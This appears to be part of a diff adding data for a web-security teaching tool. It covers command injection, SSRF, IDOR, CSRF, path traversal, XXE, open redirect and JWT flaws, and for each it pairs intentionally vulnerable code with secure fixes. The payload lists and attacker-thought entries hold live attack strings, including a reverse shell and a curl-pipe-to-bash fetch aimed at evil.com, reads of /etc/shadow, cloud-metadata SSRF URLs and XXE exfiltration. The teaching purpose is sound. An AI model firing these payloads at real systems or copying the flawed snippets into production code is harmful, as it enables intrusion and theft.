+  analogy:"You're a customer at a restaurant. You order 'pasta with garlic'. The chef reads this aloud to a robot arm that executes it literally. Now you order 'pasta; also burn down the kitchen'. The robot arm doesn't know the difference — it just runs both commands. Your app is the chef.",
+  steps:["Is user input passed to a shell command?","Are metacharacters (;|&) filtered?","What OS user runs this process?","What files/commands are accessible?","Can an attacker pivot to full server access?"],
+  vulnCode:{
+    Python:`<span class="kw-blue">import</span> os\n<span class="kw-purple">filename</span> = request.args.get(<span class="kw-orange">'file'</span>)\n<span class="highlight-line">output = os.system(<span class="kw-orange">f"convert {filename} output.pdf"</span>)</span>`,
+    PHP:`<span class="kw-purple">$file</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'file'</span>];\n<span class="highlight-line"><span class="kw-purple">$out</span> = shell_exec(<span class="kw-orange">"convert "</span> . <span class="kw-purple">$file</span> . <span class="kw-orange">" out.pdf"</span>);</span>`,
+    'Node.js':`<span class="kw-blue">const</span> { exec } = require(<span class="kw-orange">'child_process'</span>);\n<span class="kw-blue">const</span> <span class="kw-purple">file</span> = req.query.file;\n<span class="highlight-line">exec(\`convert \${file} out.pdf\`, (<span class="kw-purple">e</span>, <span class="kw-purple">out</span>) => res.send(out));</span>`,
+    Java:`<span class="kw-blue">String</span> file = request.getParameter(<span class="kw-orange">"file"</span>);\n<span class="highlight-line">Runtime.getRuntime().exec(<span class="kw-orange">"convert "</span> + file + <span class="kw-orange">" out.pdf"</span>);</span>`
+  },
+  secureCode:{
+    Python:`<span class="kw-blue">import</span> subprocess\n<span class="kw-purple">filename</span> = request.args.get(<span class="kw-orange">'file'</span>, <span class="kw-orange">''</span>)\n<span class="highlight-safe"><span class="kw-muted"># Use list args — no shell interpolation</span>\noutput = subprocess.run(\n  [<span class="kw-orange">'convert'</span>, filename, <span class="kw-orange">'output.pdf'</span>],\n  capture_output=<span class="kw-blue">True</span>, shell=<span class="kw-blue">False</span>\n)</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-purple">$file</span> = <span class="kw-blue">escapeshellarg</span>(<span class="kw-yellow">$_GET</span>[<span class="kw-orange">'file'</span>]);\n<span class="kw-purple">$out</span> = shell_exec(<span class="kw-orange">"convert "</span> . <span class="kw-purple">$file</span> . <span class="kw-orange">" out.pdf"</span>);</span>`,
+    'Node.js':`<span class="kw-blue">const</span> { execFile } = require(<span class="kw-orange">'child_process'</span>);\n<span class="highlight-safe">execFile(<span class="kw-orange">'convert'</span>, [file, <span class="kw-orange">'out.pdf'</span>], (<span class="kw-purple">e</span>, <span class="kw-purple">out</span>) => {\n  res.send(out);\n});</span>`,
+    Java:`<span class="highlight-safe">ProcessBuilder pb = <span class="kw-blue">new</span> ProcessBuilder(<span class="kw-orange">"convert"</span>, file, <span class="kw-orange">"out.pdf"</span>);\npb.start();</span>`
+  },
+  thoughts:[
+    {t:"User controls the 'file' parameter directly fed to a shell."},
+    {t:"I inject: ?file=image.jpg; cat /etc/passwd"},
+    {t:"The semicolon ends the first command and starts a new one."},
+    {t:"Or: ?file=x; curl http://evil.com/shell.sh | bash"},
+    {t:"Full remote code execution — I now own this server."},
+    {t:"Escalate privileges, install backdoor, pivot to internal network."}
+  ],
+  payloads:["img.jpg; cat /etc/passwd","img.jpg && id","img.jpg | nc evil.com 4444 -e /bin/bash","img.jpg; curl evil.com/shell.sh|bash"]
+},
+ssrf:{
+  title:'Server-Side Request Forgery (SSRF)',subtitle:'Making the server fetch internal resources on your behalf',
+  severity:'HIGH',owasp:'A10:2021',cwe:'CWE-918',
+  langs:['Python','Node.js','PHP'],
+  analogy:"You're at a reception desk. You hand the receptionist a note: 'Please call this number and read me whatever they say.' The receptionist dials — but you wrote your company's own internal finance hotline. The receptionist trusts you and reads back confidential data. The server is the receptionist.",
+  steps:["Does the server make HTTP requests based on user input?","Can I point it at internal addresses (127.0.0.1, 169.254.x.x)?","Is there an allow-list of permitted hosts?","What internal services might be reachable?","Cloud metadata? (169.254.169.254)"],
+  vulnCode:{
+    Python:`url = request.args.get(<span class="kw-orange">'url'</span>)\n<span class="highlight-line">response = requests.get(url)</span>\n<span class="kw-blue">return</span> response.text`,
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">url</span> = req.query.url;\n<span class="highlight-line"><span class="kw-blue">const</span> <span class="kw-purple">data</span> = <span class="kw-blue">await</span> fetch(url);</span>\nres.send(<span class="kw-blue">await</span> data.text());`,
+    PHP:`<span class="kw-purple">$url</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'url'</span>];\n<span class="highlight-line"><span class="kw-purple">$data</span> = <span class="kw-blue">file_get_contents</span>(<span class="kw-purple">$url</span>);</span>\n<span class="kw-blue">echo</span> <span class="kw-purple">$data</span>;`
+  },
+  secureCode:{
+    Python:`<span class="kw-blue">from</span> urllib.parse <span class="kw-blue">import</span> urlparse\n<span class="kw-purple">ALLOWED</span> = {<span class="kw-orange">'api.trusted.com'</span>}\n<span class="highlight-safe"><span class="kw-purple">parsed</span> = urlparse(url)\n<span class="kw-blue">if</span> parsed.hostname <span class="kw-blue">not in</span> <span class="kw-purple">ALLOWED</span>:\n    abort(<span class="kw-green">403</span>)\nresponse = requests.get(url, timeout=<span class="kw-green">5</span>)</span>`,
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">ALLOWED</span> = [<span class="kw-orange">'api.trusted.com'</span>];\n<span class="highlight-safe"><span class="kw-blue">const</span> <span class="kw-purple">parsed</span> = <span class="kw-blue">new</span> URL(url);\n<span class="kw-blue">if</span> (!<span class="kw-purple">ALLOWED</span>.includes(<span class="kw-purple">parsed</span>.hostname)) {\n  <span class="kw-blue">return</span> res.status(<span class="kw-green">403</span>).json({error:<span class="kw-orange">'Host not allowed'</span>});\n}</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-purple">$allowed</span> = [<span class="kw-orange">'api.trusted.com'</span>];\n<span class="kw-purple">$host</span> = parse_url(<span class="kw-purple">$url</span>, <span class="kw-yellow">PHP_URL_HOST</span>);\n<span class="kw-blue">if</span> (!<span class="kw-blue">in_array</span>(<span class="kw-purple">$host</span>, <span class="kw-purple">$allowed</span>)) die(<span class="kw-orange">'Blocked'</span>);</span>`
+  },
+  thoughts:[
+    {t:"The server fetches any URL I provide with no validation."},
+    {t:"?url=http://127.0.0.1/admin — internal admin panel!"},
+    {t:"?url=http://169.254.169.254/latest/meta-data/ — AWS cloud keys."},
+    {t:"?url=file:///etc/passwd — can read local files too."},
+    {t:"The server trusts me because it trusts itself internally."}
+  ],
+  payloads:["http://127.0.0.1:8080/admin","http://169.254.169.254/latest/meta-data/","http://192.168.1.1/","file:///etc/passwd"]
+},
+idor:{
+  title:'Insecure Direct Object Reference (IDOR)',subtitle:'Accessing objects by manipulating predictable identifiers',
+  severity:'HIGH',owasp:'A01:2021',cwe:'CWE-639',
+  langs:['Node.js','Python','PHP','Java'],
+  analogy:"You check into a hotel. Your room is 101. You notice room numbers are sequential. You try key 102 and the door opens. The hotel handed you a skeleton key — because they check the room number, not whether this key belongs to you. IDOR is the digital equivalent.",
+  steps:["Are object IDs predictable (1,2,3)?","Does the server verify ownership?","Can I change an ID in the request?","What data belongs to other users?","Can I write/delete other users' data?"],
+  vulnCode:{
+    'Node.js':`<span class="kw-purple">app</span>.<span class="kw-blue">get</span>(<span class="kw-orange">'/api/orders/:id'</span>, <span class="kw-blue">async</span> (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n<span class="highlight-line">  <span class="kw-blue">const</span> <span class="kw-purple">order</span> = <span class="kw-blue">await</span> db.orders.findById(req.params.id);</span>\n  <span class="kw-muted">// No ownership check!</span>\n  res.json(<span class="kw-purple">order</span>);\n});`,
+    Python:`<span class="kw-blue">@</span>app.route(<span class="kw-orange">'/orders/&lt;int:order_id&gt;'</span>)\n<span class="kw-blue">def</span> get_order(order_id):\n<span class="highlight-line">    order = Order.query.get(order_id)</span>\n    <span class="kw-muted"># Missing: if order.user_id != current_user.id: abort(403)</span>\n    <span class="kw-blue">return</span> jsonify(order)`,
+    PHP:`<span class="kw-purple">$id</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'order_id'</span>];\n<span class="highlight-line"><span class="kw-purple">$order</span> = <span class="kw-blue">db_query</span>(<span class="kw-orange">"SELECT * FROM orders WHERE id=?"</span>, [<span class="kw-purple">$id</span>]);</span>\n<span class="kw-muted">// No user_id == session user check</span>`,
+    Java:`<span class="kw-blue">int</span> orderId = Integer.parseInt(request.getParameter(<span class="kw-orange">"id"</span>));\n<span class="highlight-line">Order order = orderDAO.findById(orderId);</span>\n<span class="kw-muted">// Missing ownership check</span>`
+  },
+  secureCode:{
+    'Node.js':`<span class="kw-purple">app</span>.<span class="kw-blue">get</span>(<span class="kw-orange">'/api/orders/:id'</span>, <span class="kw-blue">async</span> (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n<span class="highlight-safe">  <span class="kw-blue">const</span> <span class="kw-purple">order</span> = <span class="kw-blue">await</span> db.orders.findOne({\n    id: req.params.id,\n    userId: req.user.id  <span class="kw-muted">// enforce ownership</span>\n  });</span>\n  <span class="kw-blue">if</span> (!<span class="kw-purple">order</span>) <span class="kw-blue">return</span> res.status(<span class="kw-green">403</span>).json({error:<span class="kw-orange">'Forbidden'</span>});\n  res.json(<span class="kw-purple">order</span>);\n});`,
+    Python:`<span class="highlight-safe">order = Order.query.filter_by(\n    id=order_id,\n    user_id=current_user.id\n).first_or_404()</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-purple">$order</span> = <span class="kw-blue">db_query</span>(<span class="kw-orange">"SELECT * FROM orders WHERE id=? AND user_id=?"</span>,\n  [<span class="kw-purple">$id</span>, <span class="kw-purple">$_SESSION</span>[<span class="kw-orange">'user_id'</span>]]);</span>`,
+    Java:`<span class="highlight-safe">Order order = orderDAO.findByIdAndUserId(orderId, currentUserId);</span>`
+  },
+  thoughts:[
+    {t:"Order IDs are sequential integers. I can just increment them."},
+    {t:"GET /api/orders/1000 → my order. GET /api/orders/999 → someone else's?"},
+    {t:"The server fetches by ID alone with no ownership verification."},
+    {t:"I can enumerate all orders, see customer data, addresses, payment info."},
+    {t:"If the endpoint allows DELETE, I can cancel other users' orders."}
+  ],
+  payloads:["Change id=1000 to id=999","Try id=1 (admin order)","Use Burp Intruder to enumerate 1-10000","Change user_id param in POST body"]
+},
+csrf:{
+  title:'Cross-Site Request Forgery (CSRF)',subtitle:'Tricking browsers into sending authenticated requests to your app',
+  severity:'HIGH',owasp:'A01:2021',cwe:'CWE-352',
+  langs:['JavaScript','PHP','Python'],
+  analogy:"You're logged into your bank. You visit a malicious website that secretly loads your bank's 'transfer money' URL in a hidden iframe. Your browser automatically sends your bank cookies with the request. The bank sees an authenticated request — because it came with valid credentials — and processes the transfer.",
+  steps:["Does the state-changing request use only cookies for auth?","Is there a CSRF token in the form?","Are CORS headers configured correctly?","Does the server check Origin/Referer headers?"],
+  vulnCode:{
+    JavaScript:`<span class="kw-muted">// No CSRF protection on a money transfer endpoint</span>\n<span class="kw-purple">app</span>.<span class="kw-blue">post</span>(<span class="kw-orange">'/transfer'</span>, (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n<span class="highlight-line">  <span class="kw-blue">const</span> { amount, to } = req.body;</span>\n  <span class="kw-muted">// Just checks session cookie — no CSRF token!</span>\n  doTransfer(req.session.userId, to, amount);\n});`,
+    PHP:`<span class="kw-blue">if</span> (<span class="kw-yellow">$_SESSION</span>[<span class="kw-orange">'user'</span>]) {\n<span class="highlight-line">  transfer(<span class="kw-yellow">$_POST</span>[<span class="kw-orange">'to'</span>], <span class="kw-yellow">$_POST</span>[<span class="kw-orange">'amount'</span>]);</span>\n  <span class="kw-muted">// No $_POST['csrf_token'] check</span>\n}`,
+    Python:`<span class="kw-blue">@</span>app.route(<span class="kw-orange">'/transfer'</span>, methods=[<span class="kw-orange">'POST'</span>])\n<span class="kw-blue">def</span> transfer():\n<span class="highlight-line">    to = request.form[<span class="kw-orange">'to'</span>]</span>\n    <span class="kw-muted"># Missing CSRF token validation</span>`
+  },
+  secureCode:{
+    JavaScript:`<span class="kw-blue">const</span> csrf = require(<span class="kw-orange">'csurf'</span>);\n<span class="highlight-safe"><span class="kw-purple">app</span>.<span class="kw-blue">use</span>(csrf({ cookie: <span class="kw-blue">true</span> }));\n<span class="kw-purple">app</span>.<span class="kw-blue">post</span>(<span class="kw-orange">'/transfer'</span>, (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n  <span class="kw-muted">// csurf middleware validates token automatically</span>\n  doTransfer(req.session.userId, req.body.to, req.body.amount);\n});</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-blue">if</span> (!hash_equals(<span class="kw-yellow">$_SESSION</span>[<span class="kw-orange">'csrf_token'</span>], <span class="kw-yellow">$_POST</span>[<span class="kw-orange">'csrf_token'</span>])) {\n  die(<span class="kw-orange">'CSRF check failed'</span>);\n}</span>`,
+    Python:`<span class="kw-blue">from</span> flask_wtf.csrf <span class="kw-blue">import</span> CSRFProtect\n<span class="highlight-safe">csrf = CSRFProtect(app)\n<span class="kw-muted"># All POST routes now validate automatically</span></span>`
+  },
+  thoughts:[
+    {t:"This endpoint changes state (money transfer) using only cookie auth."},
+    {t:"I host: <form action='https://bank.com/transfer' method='POST'>"},
+    {t:"I add hidden fields: to=myaccount&amount=9999"},
+    {t:"I trick the victim into visiting my page — browser auto-sends their cookies."},
+    {t:"The bank sees a valid authenticated POST — processes the transfer."}
+  ],
+  payloads:["<form action='https://target.com/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='9999'></form>","fetch('https://target.com/api/password',{method:'POST',credentials:'include',body:'pw=hacked'})"]
+},
+path:{
+  title:'Path Traversal',subtitle:'Accessing files outside the intended directory via ../ sequences',
+  severity:'MED',owasp:'A01:2021',cwe:'CWE-22',
+  langs:['Python','Node.js','PHP'],
+  analogy:"You work in a library. Your job is to fetch books from the 'Public' shelf. A patron asks for: '../../Manager/salary_data'. You walk up two floors and retrieve it. The path instruction worked — because nobody told you to stay on one floor.",
+  steps:["Is a filename or path controlled by the user?","Is it validated against a base directory?","Are ../ sequences stripped or blocked?","What files are accessible as the app user?"],
+  vulnCode:{
+    Python:`<span class="kw-purple">filename</span> = request.args.get(<span class="kw-orange">'file'</span>)\n<span class="highlight-line">path = <span class="kw-orange">f"/var/www/uploads/{filename}"</span></span>\n<span class="kw-blue">with</span> <span class="kw-blue">open</span>(path) <span class="kw-blue">as</span> f:\n    <span class="kw-blue">return</span> f.read()`,
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">file</span> = req.query.file;\n<span class="highlight-line"><span class="kw-blue">const</span> <span class="kw-purple">fp</span> = path.join(<span class="kw-orange">'/var/www/uploads'</span>, file);</span>\nfs.readFile(<span class="kw-purple">fp</span>, (<span class="kw-purple">e</span>, <span class="kw-purple">d</span>) => res.send(d));`,
+    PHP:`<span class="kw-purple">$file</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'file'</span>];\n<span class="highlight-line"><span class="kw-purple">$content</span> = <span class="kw-blue">file_get_contents</span>(<span class="kw-orange">"/uploads/"</span> . <span class="kw-purple">$file</span>);</span>`
+  },
+  secureCode:{
+    Python:`<span class="kw-blue">import</span> os\n<span class="kw-purple">BASE</span> = <span class="kw-orange">'/var/www/uploads'</span>\n<span class="highlight-safe"><span class="kw-purple">full</span> = os.path.realpath(os.path.join(<span class="kw-purple">BASE</span>, filename))\n<span class="kw-blue">if not</span> full.startswith(<span class="kw-purple">BASE</span> + <span class="kw-orange">'/'</span>):\n    abort(<span class="kw-green">403</span>)\n<span class="kw-blue">with</span> <span class="kw-blue">open</span>(full) <span class="kw-blue">as</span> f: <span class="kw-blue">return</span> f.read()</span>`,
+    'Node.js':`<span class="highlight-safe"><span class="kw-blue">const</span> <span class="kw-purple">base</span> = <span class="kw-orange">'/var/www/uploads'</span>;\n<span class="kw-blue">const</span> <span class="kw-purple">full</span> = path.resolve(base, file);\n<span class="kw-blue">if</span> (!full.startsWith(base + <span class="kw-orange">'/'</span>)) {\n  <span class="kw-blue">return</span> res.status(<span class="kw-green">403</span>).send(<span class="kw-orange">'Forbidden'</span>);\n}</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-purple">$full</span> = <span class="kw-blue">realpath</span>(<span class="kw-orange">'/uploads/'</span> . <span class="kw-purple">$file</span>);\n<span class="kw-blue">if</span> (<span class="kw-blue">strpos</span>(<span class="kw-purple">$full</span>, <span class="kw-orange">'/uploads/'</span>) !== <span class="kw-green">0</span>) die(<span class="kw-orange">'Blocked'</span>);</span>`
+  },
+  thoughts:[
+    {t:"The file param is concatenated to a base path without validation."},
+    {t:"?file=../../etc/passwd exits the uploads directory entirely."},
+    {t:"On Linux: /var/www/uploads/../../etc/passwd resolves to /etc/passwd."},
+    {t:"I can read: /etc/shadow (password hashes), SSH keys, app config files."},
+    {t:"URL encoding (%2e%2e%2f) can bypass naive string filters."}
+  ],
+  payloads:["../../etc/passwd","../../../etc/shadow","%2e%2e%2fetc%2fpasswd","....//....//etc/passwd"]
+},
+xxe:{
+  title:'XML External Entity (XXE)',subtitle:'Exploiting XML parsers to read files or perform SSRF',
+  severity:'MED',owasp:'A05:2021',cwe:'CWE-611',
+  langs:['Java','Python','PHP','Node.js'],
+  analogy:"You hand someone a recipe card. They promise to follow it exactly. Unknown to them, your recipe references a secret 'ingredient' stored in the manager's safe. They obediently fetch the ingredient and hand it back to you. XML parsers that resolve external entities do exactly this.",
+  steps:["Does the app parse XML?","Are external entities enabled (DTD processing)?","Can I reference a local file?","Can I exfiltrate the data out-of-band?"],
+  vulnCode:{
+    Java:`<span class="kw-blue">DocumentBuilderFactory</span> dbf = DocumentBuilderFactory.newInstance();\n<span class="kw-muted">// Default Java SAX parser — XXE enabled by default!</span>\n<span class="highlight-line"><span class="kw-blue">DocumentBuilder</span> db = dbf.newDocumentBuilder();</span>\n<span class="highlight-line"><span class="kw-blue">Document</span> doc = db.parse(<span class="kw-blue">new</span> InputSource(inputStream));</span>`,
+    Python:`<span class="kw-blue">from</span> lxml <span class="kw-blue">import</span> etree\n<span class="highlight-line">tree = etree.parse(user_uploaded_file)</span>`,
+    PHP:`<span class="highlight-line"><span class="kw-purple">$dom</span> = <span class="kw-blue">simplexml_load_string</span>(<span class="kw-purple">$xmlInput</span>);</span>`,
+    'Node.js':`<span class="kw-blue">const</span> xml2js = require(<span class="kw-orange">'xml2js'</span>);\n<span class="highlight-line">xml2js.parseString(userXml, (<span class="kw-purple">e</span>, <span class="kw-purple">r</span>) => res.json(<span class="kw-purple">r</span>));</span>`
+  },
+  secureCode:{
+    Java:`<span class="highlight-safe">dbf.setFeature(<span class="kw-orange">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="kw-blue">true</span>);\ndbf.setFeature(<span class="kw-orange">"http://xml.org/sax/features/external-general-entities"</span>, <span class="kw-blue">false</span>);\ndbf.setXIncludeAware(<span class="kw-blue">false</span>);\ndbf.setExpandEntityReferences(<span class="kw-blue">false</span>);</span>`,
+    Python:`<span class="highlight-safe"><span class="kw-blue">from</span> defusedxml <span class="kw-blue">import</span> etree\ntree = etree.parse(user_uploaded_file)  <span class="kw-muted"># safe by default</span></span>`,
+    PHP:`<span class="highlight-safe">libxml_disable_entity_loader(<span class="kw-blue">true</span>);\n<span class="kw-purple">$dom</span> = <span class="kw-blue">simplexml_load_string</span>(<span class="kw-purple">$xmlInput</span>, <span class="kw-orange">'SimpleXMLElement'</span>, <span class="kw-yellow">LIBXML_NONET</span>);</span>`,
+    'Node.js':`<span class="kw-blue">const</span> { XMLParser } = require(<span class="kw-orange">'fast-xml-parser'</span>);\n<span class="highlight-safe"><span class="kw-blue">const</span> parser = <span class="kw-blue">new</span> XMLParser({ processEntities: <span class="kw-blue">false</span> });</span>`
+  },
+  thoughts:[
+    {t:"The app accepts XML input and parses it server-side."},
+    {t:"I inject: <!DOCTYPE x [<!ENTITY f SYSTEM 'file:///etc/passwd'>]>"},
+    {t:"Then: <data>&f;</data> — the parser replaces &f; with file contents."},
+    {t:"Out-of-band: <!ENTITY e SYSTEM 'http://evil.com/?data='> exfiltrates data."},
+    {t:"I can also use SSRF to reach internal network services via http://."}
+  ],
+  payloads:["<!DOCTYPE x [<!ENTITY f SYSTEM 'file:///etc/passwd'>]><root>&f;</root>","<!DOCTYPE x [<!ENTITY e SYSTEM 'http://evil.com/?'>]><root>&e;</root>"]
+},
+redirect:{
+  title:'Open Redirect',subtitle:'Redirecting users to attacker-controlled URLs via your trusted domain',
+  severity:'MED',owasp:'A01:2021',cwe:'CWE-601',
+  langs:['Node.js','PHP','Python'],
+  analogy:"You trust a sign on Google's campus that says 'Exit this way →'. You follow it. But someone has replaced the sign with one pointing to a dark alley. You trusted the sign because it was on Google's property — but the destination wasn't safe. Open redirects weaponize your trust in a domain.",
+  steps:["Does a URL parameter control where users get redirected?","Is the destination validated against an allow-list?","Can I use this to phish users from a trusted domain?","Can it bypass OAuth callback validation?"],
+  vulnCode:{
+    'Node.js':`<span class="kw-purple">app</span>.<span class="kw-blue">get</span>(<span class="kw-orange">'/login'</span>, (<span class="kw-purple">req</span>, <span class="kw-purple">res</span>) => {\n  <span class="kw-muted">// Redirect after login</span>\n<span class="highlight-line">  res.redirect(req.query.next);</span>\n});`,
+    PHP:`<span class="kw-purple">$next</span> = <span class="kw-yellow">$_GET</span>[<span class="kw-orange">'next'</span>];\n<span class="highlight-line"><span class="kw-blue">header</span>(<span class="kw-orange">"Location: " . $next</span>);</span>`,
+    Python:`<span class="kw-purple">next_url</span> = request.args.get(<span class="kw-orange">'next'</span>, <span class="kw-orange">'/'</span>)\n<span class="highlight-line"><span class="kw-blue">return</span> redirect(next_url)</span>`
+  },
+  secureCode:{
+    'Node.js':`<span class="kw-blue">const</span> <span class="kw-purple">ALLOWED</span> = [<span class="kw-orange">'/'</span>, <span class="kw-orange">'/dashboard'</span>, <span class="kw-orange">'/profile'</span>];\n<span class="highlight-safe"><span class="kw-blue">const</span> <span class="kw-purple">next</span> = req.query.next || <span class="kw-orange">'/'</span>;\n<span class="kw-blue">if</span> (!<span class="kw-purple">ALLOWED</span>.includes(<span class="kw-purple">next</span>) || <span class="kw-purple">next</span>.startsWith(<span class="kw-orange">'http'</span>)) {\n  <span class="kw-blue">return</span> res.redirect(<span class="kw-orange">'/'</span>);\n}\nres.redirect(<span class="kw-purple">next</span>);</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-purple">$allowed</span> = [<span class="kw-orange">'/'</span>, <span class="kw-orange">'/dashboard'</span>];\n<span class="kw-blue">if</span> (!<span class="kw-blue">in_array</span>(<span class="kw-purple">$next</span>, <span class="kw-purple">$allowed</span>)) <span class="kw-purple">$next</span> = <span class="kw-orange">'/'</span>;</span>`,
+    Python:`<span class="kw-blue">from</span> urllib.parse <span class="kw-blue">import</span> urlparse\n<span class="highlight-safe"><span class="kw-purple">parsed</span> = urlparse(next_url)\n<span class="kw-blue">if</span> parsed.netloc:  <span class="kw-muted"># has domain = external</span>\n    next_url = <span class="kw-orange">'/'</span></span>`
+  },
+  thoughts:[
+    {t:"?next= controls where users land after login on a trusted domain."},
+    {t:"?next=https://evil-phishing-site.com"},
+    {t:"Email: 'Login at trusted.com?next=evil.com' — victim trusts the domain."},
+    {t:"Users see trusted.com in the link but land on evil.com."},
+    {t:"Also abuses OAuth redirect_uri validation in some broken implementations."}
+  ],
+  payloads:["/login?next=https://evil.com","/login?next=//evil.com","/login?next=%2F%2Fevil.com","?redirect_url=https://phishing.com"]
+},
+jwt:{
+  title:'JWT Vulnerabilities',subtitle:'Exploiting weak JWT implementations to forge authentication tokens',
+  severity:'LOW',owasp:'A02:2021',cwe:'CWE-347',
+  langs:['Node.js','Python','PHP'],
+  analogy:"A concert venue uses wristbands stamped 'VIP' in red ink. Staff verify bands visually. An attacker gets a regular wristband, bleaches it, and stamps their own 'VIP'. The venue's trust is in the stamp pattern, not a cryptographic signature. Weak JWTs trust the token's own claims about how to verify it.",
+  steps:["What algorithm does the JWT header specify?","Does the server blindly trust the 'alg' header?","Is the secret key strong enough to brute-force?","Does the server accept alg=none?","Are claims (exp, iss, aud) actually validated?"],
+  vulnCode:{
+    'Node.js':`<span class="kw-muted">// Vulnerable: trusts algorithm from token header</span>\n<span class="kw-blue">const</span> decoded = jwt.verify(token, publicKey, {\n<span class="highlight-line">  algorithms: [<span class="kw-orange">'HS256'</span>, <span class="kw-orange">'RS256'</span>, <span class="kw-orange">'none'</span>]  <span class="kw-muted">// 'none' = no sig needed!</span></span>\n});`,
+    Python:`<span class="kw-blue">import</span> jwt\n<span class="highlight-line">payload = jwt.decode(token, options={<span class="kw-orange">"verify_signature"</span>: <span class="kw-blue">False</span>})</span>`,
+    PHP:`<span class="kw-muted">// Weak secret — brute-forceable</span>\n<span class="highlight-line"><span class="kw-purple">$secret</span> = <span class="kw-orange">"secret"</span>;</span>\n<span class="kw-purple">$payload</span> = JWT::decode(<span class="kw-purple">$token</span>, <span class="kw-purple">$secret</span>, [<span class="kw-orange">'HS256'</span>]);`
+  },
+  secureCode:{
+    'Node.js':`<span class="highlight-safe"><span class="kw-blue">const</span> decoded = jwt.verify(token, SECRET, {\n  algorithms: [<span class="kw-orange">'HS256'</span>],  <span class="kw-muted">// whitelist only one alg</span>\n  issuer: <span class="kw-orange">'my-app'</span>,\n  audience: <span class="kw-orange">'users'</span>\n});</span>`,
+    Python:`<span class="highlight-safe">payload = jwt.decode(\n  token, SECRET,\n  algorithms=[<span class="kw-orange">"HS256"</span>],\n  options={<span class="kw-orange">"require"</span>: [<span class="kw-orange">"exp"</span>, <span class="kw-orange">"iat"</span>]}\n)</span>`,
+    PHP:`<span class="highlight-safe"><span class="kw-muted">// Use a strong 256-bit secret</span>\n<span class="kw-purple">$secret</span> = bin2hex(random_bytes(<span class="kw-green">32</span>));\n<span class="kw-purple">$payload</span> = JWT::decode(<span class="kw-purple">$token</span>, <span class="kw-purple">$secret</span>, [<span class="kw-orange">'HS256'</span>]);</span>`
+  },
+  thoughts:[
+    {t:"JWT header says alg=none. Does the server accept it?"},
+    {t:"Strip signature → set alg=none → server might skip verification."},
+    {t:"RS256 → HS256 confusion: sign with public key using HMAC."},
+    {t:"Try hashcat on weak secrets: 'secret', 'password', '123456'."},
+    {t:"Change role=user to role=admin in payload if sig not verified."}
+  ],
+  payloads:["Set alg:none, remove signature","Change payload role:admin with alg:none","HS256 with secret='secret' via hashcat","Flip RS256 to HS256 with public key"]
+}
+};
+
+// ============================================================
+// DATA: VULNERABILITY LIST (Explorer)
+// ============================================================
+const VULNS_LIST = [
+  {id:'sqli',name:'SQL Injection',sev:'CRIT',owasp:'A03',cat:'Injection',desc:'Unsanitized SQL queries'},
+  {id:'xss',name:'Cross-Site Scripting',sev:'CRIT',owasp:'A03',cat:'Injection',desc:'Script injection into pages'},
+  {id:'cmdi',name:'Command Injection',sev:'CRIT',owasp:'A03',cat:'Injection',desc:'OS command execution'},
+  {id:'deser',name:'Deserialization',sev:'CRIT',owasp:'A08',cat:'Injection',desc:'Unsafe object deserialization'},
+  {id:'ssrf',name:'SSRF',sev:'HIGH',owasp:'A10',cat:'Access Control',desc:'Server fetches internal URLs'},
+  {id:'idor',name:'IDOR',sev:'HIGH',owasp:'A01',cat:'Access Control',desc:'Unauthorized object access'},
+  {id:'csrf',name:'CSRF',sev:'HIGH',owasp:'A01',cat:'Auth',desc:'Forged cross-site requests'},
+  {id:'nosql',name:'NoSQL Injection',sev:'HIGH',owasp:'A03',cat:'Injection',desc:'MongoDB operator injection'},
+  {id:'upload',name:'File Upload',sev:'HIGH',owasp:'A04',cat:'Config',desc:'Malicious file execution'},
+  {id:'mass',name:'Mass Assignment',sev:'HIGH',owasp:'A05',cat:'Config',desc:'Unfiltered model binding'},
+  {id:'path',name:'Path Traversal',sev:'MED',owasp:'A01',cat:'Access Control',desc:'Directory escape via ../'},
+  {id:'xxe',name:'XXE',sev:'MED',owasp:'A05',cat:'Injection',desc:'XML entity file read'},
+  {id:'redirect',name:'Open Redirect',sev:'MED',owasp:'A01',cat:'Access Control',desc:'Redirect to external URLs'},
+  {id:'proto',name:'Prototype Pollution',sev:'MED',owasp:'A03',cat:'Injection',desc:'JS object prototype tamper'},
+  {id:'ratelimit',name:'Rate Limiting',sev:'MED',owasp:'A07',cat:'Auth',desc:'No brute-force protection'},
+  {id:'race',name:'Race Conditions',sev:'MED',owasp:'A04',cat:'Logic',desc:'TOCTOU & concurrency bugs'},
+  {id:'jwt',name:'JWT Mistakes',sev:'LOW',owasp:'A02',cat:'Crypto',desc:'Token signature bypass'},
+  {id:'click',name:'Clickjacking',sev:'LOW',owasp:'A05',cat:'Config',desc:'UI redressing attacks'},
+];
+
+// ============================================================
+// DATA: GLOSSARY
+// ============================================================
+const GLOSSARY = [
+  {term:'Sink',def:'The point in code where user-controlled data is used in a dangerous way — e.g., passed to a SQL query, rendered as HTML, or executed as a command.'},
+  {term:'Source',def:'Where user input enters the application — GET/POST parameters, headers, cookies, file uploads, WebSocket messages.'},
+  {term:'Taint Analysis',def:'Tracking data from its source through the program to its sink to identify whether it\'s sanitized along the way.'},
+  {term:'OWASP Top 10',def:'Open Web Application Security Project\'s annually updated list of the ten most critical web application security risks.'},
+  {term:'CWE',def:'Common Weakness Enumeration — a community-developed list of software security weakness types, maintained by MITRE.'},
+  {term:'CVE',def:'Common Vulnerabilities and Exposures — a unique identifier for publicly disclosed security vulnerabilities in specific software.'},
+  {term:'Prepared Statement',def:'A parameterized database query where user input is passed separately from the query structure, preventing SQL injection.'},
